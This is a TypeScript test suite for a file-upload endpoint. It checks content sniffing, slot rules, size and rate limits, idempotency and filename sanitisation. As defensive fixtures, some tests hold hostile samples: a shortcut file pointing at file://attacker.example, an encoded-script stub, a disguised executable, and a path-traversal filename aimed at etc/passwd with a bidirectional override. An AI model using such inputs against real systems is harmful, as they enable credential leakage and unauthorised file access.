import { createHash } from "node:crypto";
import { createMemoryStorage } from "@kr/storage/testing";
import type { LightMyRequestResponse } from "fastify";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { createFactories, type Factories } from "../../../../test/factories.js";
import {
  apiRequest,
  createTestApp,
  signIn,
  testConfig,
  type SignedIn,
  type TestApp,
} from "../../../../test/helpers/index.js";
import { dwgBytes, emlBytes, msgBytes, pdfBytes, pngBytes, textBytes, uploadFile } from "../testing.js";

interface UploadBody {
  file: Record<string, unknown> & { id: string };
  operation: { id: string; type: string; status: string } | null;
}

async function storedKeys(t: Pick<TestApp, "storage">): Promise<string[]> {
  const keys: string[] = [];
  for await (const o of t.storage.list("jobs/")) keys.push(o.key);
  return keys;
}

describe("uploadFile (real Postgres, in-memory storage)", () => {
  let t: TestApp;
  let f: Factories;
  let staff: SignedIn, client: SignedIn, architect: SignedIn;
  const as = async (role: "admin" | "kr_admin" | "staff" | "external") => signIn(t, await f.makeUser({ role }));
  const fresh = async () => {
    const job = await f.makeJob();
    await f.makeGrant({ jobId: job.id, userId: client.user.id, role: "client" });
    await f.makeGrant({ jobId: job.id, userId: architect.user.id, role: "architect" });
    return job;
  };
  const problem = (res: LightMyRequestResponse) => res.json<{ type: string; status: number; detail?: string }>();
  const filesOf = (jobId: string) => t.db.selectFrom("files").selectAll().where("job_id", "=", jobId).execute();
  const slotUpload = (
    jobId: string,
    who: SignedIn | undefined,
    key: string,
    slot: string,
    name: string,
    data: Buffer,
  ) =>
    uploadFile(t, { jobId, ...(who ? { as: who } : {}), fields: { checkpointKey: key, slot }, file: { name, data } });

  beforeAll(async () => {
    t = await createTestApp({ config: testConfig({ RATE_LIMIT_UPLOADS_PER_MINUTE: "1000" }) });
    f = createFactories(t.db);
    [staff, client, architect] = [await as("staff"), await as("external"), await as("external")];
  });
  afterAll(async () => {
    await t.close();
  });

  it("stores a PDF in a slot: 201 FileMeta, pending scan, a file.scan operation, an audit row and the object", async () => {
    const job = await fresh();
    const data = pdfBytes(300, "survey");
    const res = await slotUpload(job.id, staff, "i2_0", "survey", "Feature survey.pdf", data);
    expect(res.statusCode).toBe(201);
    const body = res.json<UploadBody>();
    expect(res.headers.location).toBe(`/v1/files/${body.file.id}`);
    expect(body.file).toMatchObject({
      jobId: job.id,
      checkpointKey: "i2_0",
      slot: "survey",
      conditionId: null,
      name: "Feature survey.pdf",
      kind: "pdf",
      contentType: "application/pdf",
      sizeBytes: data.length,
      scanStatus: "pending",
      uploadedAt: t.deps.clock.now().toISOString(),
      uploadedBy: { id: staff.user.id, displayName: staff.user.display_name },
      canDelete: true,
      email: null,
    });
    expect(body.operation).toMatchObject({ type: "file.scan", status: "queued" });

    const [row] = await filesOf(job.id);
    expect(row).toMatchObject({
      id: body.file.id,
      scan_status: "pending",
      scan_attempts: 0,
      uploaded_by: staff.user.id,
    });
    expect(row?.storage_key).toBe(`jobs/${job.id}/${body.file.id}`);
    expect(row?.sha256.toString("hex")).toBe(createHash("sha256").update(data).digest("hex"));
    expect((await t.storage.head(row?.storage_key ?? "")).size).toBe(data.length);
    const op = await t.db.selectFrom("operations").selectAll().where("job_id", "=", job.id).executeTakeFirstOrThrow();
    expect(op).toMatchObject({
      id: body.operation?.id,
      type: "file.scan",
      status: "queued",
      created_by: staff.user.id,
    });
    expect(op.payload).toEqual({ fileId: body.file.id });
    const audits = await t.db.selectFrom("audit_events").selectAll().where("job_id", "=", job.id).execute();
    expect(audits).toHaveLength(1);
    expect(audits[0]).toMatchObject({
      action: "file.uploaded",
      entity_type: "file",
      entity_id: body.file.id,
      actor_user_id: staff.user.id,
    });
    expect(audits[0]?.changes).toEqual({
      name: { from: null, to: "Feature survey.pdf" },
      kind: { from: null, to: "pdf" },
      sizeBytes: { from: null, to: data.length },
      checkpointKey: { from: null, to: "i2_0" },
      slot: { from: null, to: "survey" },
    });
  });

  it("sniffs the content: an HTML file named .pdf is refused (415) and nothing is stored", async () => {
    const job = await fresh();
    const before = (await storedKeys(t)).length;
    const res = await slotUpload(
      job.id,
      staff,
      "i2_0",
      "survey",
      "plan.pdf",
      Buffer.from("<!doctype html><script>x</script>"),
    );
    expect(res.statusCode).toBe(415);
    expect(res.headers["content-type"]).toContain("application/problem+json");
    expect(res.json()).toMatchObject({
      type: "urn:kr:problem:unsupported-media-type",
      detail: "HTML and XML documents are not accepted",
    });
    const png = await slotUpload(job.id, staff, "i2_0", "survey", "x.png", pngBytes());
    expect(png.json<{ detail: string }>().detail).toBe("This box accepts PDF or DWG files only.");
    expect(await filesOf(job.id)).toEqual([]);
    expect(await storedKeys(t)).toHaveLength(before);
  });

  it("MALWARE_SCAN_MODE=disabled stores the file as skipped and queues no scan", async () => {
    const local = await createTestApp({ config: testConfig({ MALWARE_SCAN_MODE: "disabled" }) });
    const lf = createFactories(local.db, 101);
    const user = await signIn(local, await lf.makeUser({ role: "staff" }));
    const job = await lf.makeJob();
    const res = await uploadFile(local, {
      jobId: job.id,
      as: user,
      fields: { checkpointKey: "i2_0", slot: "survey" },
      file: { name: "a.pdf", data: pdfBytes() },
    });
    expect(res.statusCode).toBe(201);
    expect(res.json<UploadBody>()).toMatchObject({ file: { scanStatus: "skipped" }, operation: null });
    const ops = await local.db.selectFrom("operations").select("id").where("job_id", "=", job.id).execute();
    expect(ops).toEqual([]);
    await local.close();
  });

  it("an email in the 4.3 slot also gets a pending email_messages row (.eml and .msg)", async () => {
    const job = await fresh();
    for (const [name, data, contentType] of [
      ["Query.eml", emlBytes(), "message/rfc822"],
      ["Query.msg", msgBytes(), "application/vnd.ms-outlook"],
    ] as const) {
      const res = await slotUpload(job.id, staff, "i4_3", "email", name, data);
      expect(res.statusCode, name).toBe(201);
      const body = res.json<UploadBody>();
      expect(body.file).toMatchObject({ kind: "email", contentType, slot: "email" });
      expect(body.file.email).toMatchObject({ parseStatus: "pending", isPasted: false, subject: null });
      const email = await t.db
        .selectFrom("email_messages")
        .selectAll()
        .where("file_id", "=", body.file.id)
        .executeTakeFirstOrThrow();
      expect(email).toMatchObject({ parse_status: "pending", is_pasted: false });
      expect(body.operation?.type).toBe("file.scan");
    }
  });

  it("with scanning disabled an email queues its parse directly", async () => {
    const local = await createTestApp({ config: testConfig({ MALWARE_SCAN_MODE: "disabled" }) });
    const lf = createFactories(local.db, 102);
    const user = await signIn(local, await lf.makeUser({ role: "staff" }));
    const job = await lf.makeJob();
    const res = await uploadFile(local, {
      jobId: job.id,
      as: user,
      fields: { checkpointKey: "i4_3", slot: "email" },
      file: { name: "q.eml", data: emlBytes() },
    });
    expect(res.statusCode).toBe(201);
    const body = res.json<UploadBody>();
    expect(body.operation?.type).toBe("email.parse");
    const op = await local.db
      .selectFrom("operations")
      .selectAll()
      .where("job_id", "=", job.id)
      .executeTakeFirstOrThrow();
    expect(op.payload).toEqual({ fileId: body.file.id });
    await local.close();
  });

  it("with scanning disabled a PDF in the 4.2 Conformance Notification slot starts its conformance read directly", async () => {
    const local = await createTestApp({ config: testConfig({ MALWARE_SCAN_MODE: "disabled" }) });
    const lf = createFactories(local.db, 190);
    const user = await signIn(local, await lf.makeUser({ role: "staff" }));
    const job = await lf.makeJob();
    const upload = (checkpointKey: string, slot: string, name: string) =>
      uploadFile(local, { jobId: job.id, as: user, fields: { checkpointKey, slot }, file: { name, data: pdfBytes() } });
    const res = await upload("i4_2", "conformance", "Conformance Notification 2026-07-20.pdf");
    expect(res.statusCode).toBe(201);
    const body = res.json<UploadBody>();
    expect(body).toMatchObject({ file: { scanStatus: "skipped" }, operation: { type: "conformance.read" } });
    const ops = await local.db.selectFrom("operations").selectAll().where("job_id", "=", job.id).execute();
    expect(ops).toHaveLength(1);
    expect(ops[0]).toMatchObject({
      type: "conformance.read",
      status: "queued",
      created_by: user.user.id,
      payload: { jobId: job.id, fileId: body.file.id, allowAi: false },
    });
    // Only the conformance slot starts a read: a survey PDF queues nothing.
    expect((await upload("i2_0", "survey", "Survey.pdf")).json<UploadBody>().operation).toBeNull();
    expect(await local.db.selectFrom("operations").select("id").where("job_id", "=", job.id).execute()).toHaveLength(1);
    await local.close();
  });

  it("with scanning disabled the read it starts carries allowAi from the ai-stamp-reading flag as it stands", async () => {
    const local = await createTestApp({
      config: testConfig({ MALWARE_SCAN_MODE: "disabled" }),
      flags: { "ai-stamp-reading": true },
    });
    const lf = createFactories(local.db, 191);
    const user = await signIn(local, await lf.makeUser({ role: "staff" }));
    const job = await lf.makeJob();
    const res = await uploadFile(local, {
      jobId: job.id,
      as: user,
      fields: { checkpointKey: "i4_2", slot: "conformance" },
      file: { name: "Conformance Notification 2026-07-20.pdf", data: pdfBytes() },
    });
    expect(res.statusCode).toBe(201);
    const op = await local.db
      .selectFrom("operations")
      .selectAll()
      .where("job_id", "=", job.id)
      .executeTakeFirstOrThrow();
    expect(op).toMatchObject({
      type: "conformance.read",
      payload: { fileId: res.json<UploadBody>().file.id, allowAi: true },
    });
    await local.close();
  });

  it("refuses executables, empty files and files of a kind the slot does not take", async () => {
    const job = await fresh();
    const exe = Buffer.concat([Buffer.from("MZ"), Buffer.alloc(100)]);
    expect((await slotUpload(job.id, staff, "i2_0", "survey", "x.pdf", exe)).statusCode).toBe(415);
    const empty = await slotUpload(job.id, staff, "i2_0", "survey", "x.pdf", Buffer.alloc(0));
    expect(empty.statusCode).toBe(415);
    expect(problem(empty).detail).toBe("The file is empty");
    const png = await slotUpload(job.id, staff, "i2_0", "survey", "x.png", pngBytes());
    expect(png.statusCode).toBe(415);
    expect(problem(png).detail).toBe("This box accepts PDF or DWG files only.");
    const pdfToEmail = await slotUpload(job.id, staff, "i4_3", "email", "x.eml", pdfBytes());
    expect(pdfToEmail.statusCode).toBe(415);
    expect(await filesOf(job.id)).toEqual([]);
  });

  it("accepts what each slot declares: DWG in the survey box, photos, text and video where listed", async () => {
    const job = await fresh();
    expect((await slotUpload(job.id, staff, "i2_0", "survey", "p.dwg", dwgBytes())).json<UploadBody>().file.kind).toBe(
      "dwg",
    );
    expect((await slotUpload(job.id, staff, "i11_0", "photos", "p.png", pngBytes())).json<UploadBody>().file.kind).toBe(
      "image",
    );
    expect(
      (await slotUpload(job.id, staff, "i13_notif", "documents", "n.txt", textBytes())).json<UploadBody>().file.kind,
    ).toBe("text");
  });

  it("refuses text under a script, shortcut, registry or executable name (415) and stores nothing", async () => {
    const job = await fresh();
    const condition = await f.makeCondition({ jobId: job.id, number: 1, agency: "Western Power" });
    const before = (await storedKeys(t)).length;
    const bodies: [string, string][] = [
      ["evil.vbe", "#@~^AAAAAA==\\r\n"],
      ["shortcut.url", "[InternetShortcut]\r\nURL=file://attacker.example/share/x\r\n"],
      ["update.reg", "Windows Registry Editor Version 5.00\r\n"],
      ["run.psm1", "function Get-Thing { 1 }\r\n"],
      ["Invoice.pdf.exe", "plain text"],
    ];
    for (const [name, text] of bodies) {
      const res = await uploadFile(t, {
        jobId: job.id,
        as: architect,
        fields: { conditionId: condition.id },
        file: { name, data: Buffer.from(text) },
      });
      expect(res.statusCode, name).toBe(415);
      expect(problem(res).detail, name).toBe("Text files must be .txt, .csv or .md");
    }
    expect(await filesOf(job.id)).toEqual([]);
    expect(await storedKeys(t)).toHaveLength(before);
    const ok = await uploadFile(t, {
      jobId: job.id,
      as: architect,
      fields: { conditionId: condition.id },
      file: { name: "evidence.txt", data: Buffer.from("plain text") },
    });
    expect(ok.statusCode).toBe(201);
  });

  it("answers 413 above UPLOAD_MAX_BYTES, accepts exactly the limit and stores nothing for the refused one", async () => {
    const local = await createTestApp({ config: testConfig({ UPLOAD_MAX_BYTES: "1024" }) });
    const lf = createFactories(local.db, 103);
    const user = await signIn(local, await lf.makeUser({ role: "staff" }));
    const job = await lf.makeJob();
    const send = (data: Buffer) =>
      uploadFile(local, {
        jobId: job.id,
        as: user,
        fields: { checkpointKey: "i2_0", slot: "survey" },
        file: { name: "Big plan.pdf", data },
      });
    const exact = pdfBytes(1024 - pdfBytes(0).length);
    expect(exact).toHaveLength(1024);
    expect((await send(exact)).statusCode).toBe(201);
    const over = await send(pdfBytes(1025 - pdfBytes(0).length));
    expect(over.statusCode).toBe(413);
    expect(over.json<{ type: string; detail: string }>()).toMatchObject({
      type: "urn:kr:problem:payload-too-large",
      detail: "Big plan.pdf is larger than 0.0 MB.",
    });
    const rows = await local.db.selectFrom("files").select("id").where("job_id", "=", job.id).execute();
    expect(rows).toHaveLength(1);
    const keys: string[] = [];
    for await (const o of local.storage.list("jobs/")) keys.push(o.key);
    expect(keys).toHaveLength(1);
    await local.close();
  });

  it("streams files far above the 100 KB JSON body limit", async () => {
    const job = await fresh();
    const big = pdfBytes(3 * 1024 * 1024);
    const res = await slotUpload(job.id, staff, "i2_0", "survey", "big.pdf", big);
    expect(res.statusCode).toBe(201);
    expect(res.json<UploadBody>().file.sizeBytes).toBe(big.length);
  });

  it("sanitises the stored name (no path parts) and never uses it in the storage key", async () => {
    const job = await fresh();
    const res = await slotUpload(
      job.id,
      staff,
      "i2_0",
      "survey",
      `..\\..\\etc/passwd${String.fromCodePoint(0x202e)}.pdf`,
      pdfBytes(),
    );
    const body = res.json<UploadBody>();
    expect(body.file.name).toBe("passwd.pdf");
    const [row] = await filesOf(job.id);
    expect(row?.storage_key).not.toContain("passwd");
  });

  describe("malformed requests", () => {
    it("400 for missing, conflicting or unknown fields and for an unknown slot", async () => {
      const job = await fresh();
      const file = { name: "a.pdf", data: pdfBytes() };
      const call = (fields: Record<string, string>) => uploadFile(t, { jobId: job.id, as: staff, fields, file });
      expect((await call({})).statusCode).toBe(400);
      expect((await call({ checkpointKey: "i2_0" })).statusCode).toBe(400);
      expect(
        (await call({ checkpointKey: "i2_0", slot: "survey", conditionId: "5c1f6a0e-3b1d-4c8e-9a52-1d2f3a4b5c6d" }))
          .statusCode,
      ).toBe(400);
      expect((await call({ checkpointKey: "i2_0", slot: "survey", other: "x" })).statusCode).toBe(400);
      expect((await call({ checkpointKey: "nope", slot: "survey" })).statusCode).toBe(400);
      const unknownSlot = await call({ checkpointKey: "i2_0", slot: "nope" });
      expect(unknownSlot.statusCode).toBe(400);
      expect(unknownSlot.json<{ errors: { path: string }[] }>().errors[0]?.path).toBe("slot");
      expect(await filesOf(job.id)).toEqual([]);
    });

    it("400 when no file is sent, when the file part has the wrong name, and when more than one file is sent", async () => {
      const job = await fresh();
      const fields = { checkpointKey: "i2_0", slot: "survey" };
      const data = pdfBytes();
      expect((await uploadFile(t, { jobId: job.id, as: staff, fields })).statusCode).toBe(400);
      expect(
        (await uploadFile(t, { jobId: job.id, as: staff, fields, file: { name: "a.pdf", data, field: "upload" } }))
          .statusCode,
      ).toBe(400);
      const two = await uploadFile(t, {
        jobId: job.id,
        as: staff,
        fields,
        file: { name: "a.pdf", data },
        extraFile: { name: "b.pdf", data },
      });
      expect(two.statusCode).toBe(400);
      expect(await filesOf(job.id)).toEqual([]);
    });

    it("400 for fields that arrive after the file and nothing stays behind", async () => {
      const job = await fresh();
      const before = (await storedKeys(t)).length;
      const res = await uploadFile(t, {
        jobId: job.id,
        as: staff,
        fields: { checkpointKey: "i2_0", slot: "survey" },
        file: { name: "a.pdf", data: pdfBytes() },
        trailingFields: { late: "x" },
      });
      expect(res.statusCode).toBe(400);
      expect(await filesOf(job.id)).toEqual([]);
      expect(await storedKeys(t)).toHaveLength(before);
    });

    it("415 when the request is not multipart", async () => {
      const job = await fresh();
      const res = await apiRequest(t, {
        method: "POST",
        url: `/v1/jobs/${job.id}/files`,
        as: staff,
        body: { checkpointKey: "i2_0" },
      });
      expect(res.statusCode).toBe(415);
    });
  });

  describe("Idempotency-Key", () => {
    it("repeating a key returns the first result, with one file and one object", async () => {
      const job = await fresh();
      const before = (await storedKeys(t)).length;
      const send = () =>
        uploadFile(t, {
          jobId: job.id,
          as: staff,
          fields: { checkpointKey: "i2_0", slot: "survey" },
          file: { name: "a.pdf", data: pdfBytes(50, "same") },
          headers: { "idempotency-key": "upload-key-0001" },
        });
      const first = await send();
      const second = await send();
      expect(first.statusCode).toBe(201);
      expect(second.statusCode).toBe(201);
      expect(second.headers["idempotent-replayed"]).toBe("true");
      expect(second.json<UploadBody>().file.id).toBe(first.json<UploadBody>().file.id);
      expect(await filesOf(job.id)).toHaveLength(1);
      expect(await storedKeys(t)).toHaveLength(before + 1);
    });

    it("the same key with another file is a 409 and its object is removed", async () => {
      const job = await fresh();
      const send = (tag: string) =>
        uploadFile(t, {
          jobId: job.id,
          as: staff,
          fields: { checkpointKey: "i2_0", slot: "survey" },
          file: { name: "a.pdf", data: pdfBytes(50, tag) },
          headers: { "idempotency-key": "upload-key-0002" },
        });
      expect((await send("one")).statusCode).toBe(201);
      const before = (await storedKeys(t)).length;
      const clash = await send("two");
      expect(clash.statusCode).toBe(409);
      expect(await storedKeys(t)).toHaveLength(before);
      expect(await filesOf(job.id)).toHaveLength(1);
    });
  });

  it("a storage failure is a 500 problem, stores no row and leaks nothing", async () => {
    const failing = await createTestApp({
      storage: { ...createMemoryStorage(), put: () => Promise.reject(new Error("bucket down: secret-endpoint")) },
    });
    const lf = createFactories(failing.db, 104);
    const user = await signIn(failing, await lf.makeUser({ role: "staff" }));
    const job = await lf.makeJob();
    const res = await uploadFile(failing, {
      jobId: job.id,
      as: user,
      fields: { checkpointKey: "i2_0", slot: "survey" },
      file: { name: "a.pdf", data: pdfBytes() },
    });
    expect(res.statusCode).toBe(500);
    expect(res.body).not.toContain("secret-endpoint");
    expect(await failing.db.selectFrom("files").select("id").where("job_id", "=", job.id).execute()).toEqual([]);
    await failing.close();
  });

  it("charges uploads to their own rate limit bucket (429 with Retry-After)", async () => {
    const limited = await createTestApp({ config: testConfig({ RATE_LIMIT_UPLOADS_PER_MINUTE: "2" }) });
    const lf = createFactories(limited.db, 105);
    const user = await signIn(limited, await lf.makeUser({ role: "staff" }));
    const job = await lf.makeJob();
    const send = () =>
      uploadFile(limited, {
        jobId: job.id,
        as: user,
        fields: { checkpointKey: "i2_0", slot: "survey" },
        file: { name: "a.pdf", data: pdfBytes() },
      });
    expect((await send()).statusCode).toBe(201);
    expect((await send()).statusCode).toBe(201);
    const third = await send();
    expect(third.statusCode).toBe(429);
    expect(third.headers["retry-after"]).toBeDefined();
    await limited.close();
  });
});
